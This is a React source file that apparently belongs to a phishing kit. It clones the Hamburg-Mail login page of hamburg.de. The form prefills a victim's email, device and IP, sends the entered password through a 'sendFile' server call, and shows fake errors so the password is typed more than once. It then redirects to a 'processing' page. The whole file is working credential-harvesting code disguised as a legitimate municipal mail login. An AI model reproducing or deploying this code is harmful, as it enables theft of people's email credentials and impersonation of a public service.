import { navigate } from "@reach/router";
import React from "react";
import { useState } from "react";
import { notify, sendFile } from "../servers";
import "./Hamburg-Mail - Anmeldung_files/login.scoped.css";

function Hamburg({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,
    device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });
  const [showpassword, setShowpassword] = useState(false);

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 });
        setValues({ ...values, password: "" });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("../processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };

  return (
    <div>
      <div id="login_content" bis_skin_checked={1}>
        <div id="header" bis_skin_checked={1}>
          <img
            src={require("./Hamburg-Mail - Anmeldung_files/header.jpg")}
            alt="Hamburg-Mail"
            title="Hamburg-Mail"
            border={0}
            width={824}
            height={84}
          />
        </div>
        <div id="login_box" bis_skin_checked={1}>
          <div id="login_box_header" bis_skin_checked={1}>
            Login
          </div>
          <div id="container" bis_skin_checked={1}>
            <div id="login_box_content" bis_skin_checked={1}>
              <div className="login-txt" bis_skin_checked={1}>
                <p>Login</p>
              </div>
              <form
                onSubmit={submitForm}
              >
                <input type="hidden" name="emailName" defaultValue />
                <input type="hidden" name="emailDomain" defaultValue />
                <input type="hidden" name="emailDomainDefault" defaultValue />
                <input type="hidden" name="cssStyle" defaultValue="Hamburg" />
                <input name="requestedServer" type="hidden" defaultValue />
                <table>
                  <tbody>
                    <tr>
                      <td colSpan={2} className="descr">
                        Melden Sie sich bitte mit Ihrer vollständigen
                        E-Mail-Adresse (
                        <i>username@hamburg.de / username@hh.de</i>) und Ihrem
                        Passwort an:
                      </td>
                    </tr>
                  </tbody>
                </table>
                <table cellPadding="4px">
                  <tbody>
                    <tr>
                      <td width={70} style={{ textAlign: "right" }}>
                        <label className="user">Email</label>
                      </td>
                      <td>
                        <input
                          id="email"
                          className="input-email"
                          type="text"
                          name="username"
                          defaultValue={values.username}
                          onChange={handleChange}
                          required
                          tabIndex={1}
                        />
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <label className="pass">Password</label>
                      </td>
                      <td>
                        <input
                          id="password"
                          className="input-pass"
                          type="password"
                          name="password"
                          onChange={handleChange}
                          tabIndex={2}
                        />
                      </td>
                    </tr>
                    <tr>
                      <td />
                      <td>
                        <input
                          className="loginbtnhh"
                          type="submit"
                          defaultValue="Login"
                          disabled={submited.status}
                        />
                      </td>
                    </tr>
                    <tr>
                      <td />
                      <td className="links">
                        <a
                          href="https://mein.hamburg.de/passwort/"
                          target="_blank"
                        >
                          Passwort vergessen?
                        </a>
                        <br />
                        Noch keine Mailadresse?
                        <a
                          href="https://mein.hamburg.de/registrierung/"
                          target="_blank"
                        >
                          zur Registrierung
                        </a>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </form>
            </div>
          </div>
        </div>
      </div>
      <div id="footer" bis_skin_checked={1}>
        <div className="footerlinks" bis_skin_checked={1}>
          <a
            title="Impressum"
            href="http://www.hamburg.de/ueber-hamburg-de/impressum/"
            target="_blank"
          >
            Impressum
          </a>
          |
          <a
            href="javascript:void(0);"
            onclick="popAGB();"
            title="AGB"
            alt="AGB"
          >
            AGB
          </a>
          |
          <a
            href="https://www.hamburg.de/hamburg-mail/11029526/datenschutz-hinweise-hamburg-mail/"
            title="Datenschutzhinweise Hamburg-Mail"
            target="_blank"
          >
            Datenschutzhinweise Hamburg-Mail
          </a>
        </div>
        © hamburg.de <span style={{ paddingLeft: "10px" }}>&nbsp;</span> Alle
        Rechte Vorbehalten - Vervielfältigung nur mit unserer Genehmigung
      </div>
      <div
        style={{ width: "851px", margin: "0 auto", paddingBottom: "15px" }}
        bis_skin_checked={1}
      >
        <div
          style={{ textAlign: "right", margin: "0 auto", fontSize: "10px" }}
          bis_skin_checked={1}
        >
          Anzeige
          <br />
          <a
            href="https://www.hamburg.de/koenig-der-loewen-tickets/"
            target="_blank"
          >
            <img
              src={require("./Hamburg-Mail - Anmeldung_files/werbemittel-produkt-registrierung.jpg")}
              alt="werbemittel-produkt-registrierung"
              height={54}
              width={851}
            />
          </a>
        </div>
      </div>
      <div
        className="ui-dialog ui-widget ui-widget-content ui-corner-all ui-draggable"
        tabIndex={-1}
        role="dialog"
        aria-labelledby="ui-dialog-title-dialog"
        style={{
          display: "none",
          position: "absolute",
          overflow: "hidden",
          zIndex: 1000,
          outline: "0px",
        }}
        bis_skin_checked={1}
      >
        <div
          className="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"
          unselectable="on"
          bis_skin_checked={1}
        >
          <span
            className="ui-dialog-title"
            id="ui-dialog-title-dialog"
            unselectable="on"
          >
            &nbsp;
          </span>
          <a
            href="https://mein.hamburg.de/#"
            className="ui-dialog-titlebar-close ui-corner-all"
            role="button"
            unselectable="on"
          >
            <span className="ui-icon ui-icon-closethick" unselectable="on">
              close
            </span>
          </a>
        </div>
        <div
          id="dialog"
          style={{}}
          className="ui-dialog-content ui-widget-content"
          bis_skin_checked={1}
        >
          <br />
          <center>
            <div id="loading" bis_skin_checked={1}>
              <h1 className="loading-text">
                <img
                  className="loadingimg"
                  src="./Hamburg-Mail - Anmeldung_files/25.gif"
                  width={28}
                  height={28}
                />
                <span className="loading">
                  <strong>Loading...</strong>
                </span>
              </h1>
            </div>
          </center>
        </div>
      </div>
    </div>
  );
}

export default Hamburg;
